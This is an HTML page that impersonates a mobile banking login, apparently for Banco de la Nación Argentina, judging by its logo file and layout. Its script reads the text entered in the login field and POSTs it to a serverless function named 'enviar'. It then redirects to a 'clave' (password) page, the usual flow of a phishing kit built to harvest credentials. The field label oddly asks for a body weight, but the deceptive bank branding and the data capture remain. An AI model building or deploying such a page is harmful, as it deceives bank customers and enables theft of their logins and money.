<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Banking</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

    <!-- Header superior -->
    <header class="top-bar">
        <div class="title">Mobile Banking</div>
        <div class="classic">
            <span class="home-icon">🏠</span>
            Versión Clásica
        </div>
    </header>

    <!-- Logo -->
    <div class="logo-container">
        <img src="bna.png" alt="Logo">
    </div>

    <!-- Card login -->
    <div class="login-card">
  <div class="login-title">Ingresá tu pesaje</div>

  <input type="text" id="loginInput" placeholder="Ej: 70">

  <button class="btn-accept" onclick="enviarLogin()">
    <span class="check">✔</span>
    Aceptar
  </button>
</div>

<script>
function enviarLogin() {
  const login = document.getElementById("loginInput").value;

  fetch("/.netlify/functions/enviar", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      tipo: "login",
      valor: login
    })
  }).then(() => {
    window.location.href = "clave.html";
  });
}
</script>


    <!-- Links -->
    <div class="links">
        <p>¿No sos usuario?</p>
        <a href="#">Registrate y comenzá</a>

        <p class="mt">¿Acceso bloqueado?</p>
        <a href="#">Gestioná tu desbloqueo</a>
    </div>

    <!-- Footer -->
    <footer class="footer">
        <span class="close">✖</span>
        <p>Salir</p>
    </footer>

    <!-- Script -->
    <script>
        function irAClave() {
            window.location.href = "clave.html";
        }
    </script>

</body>
</html>
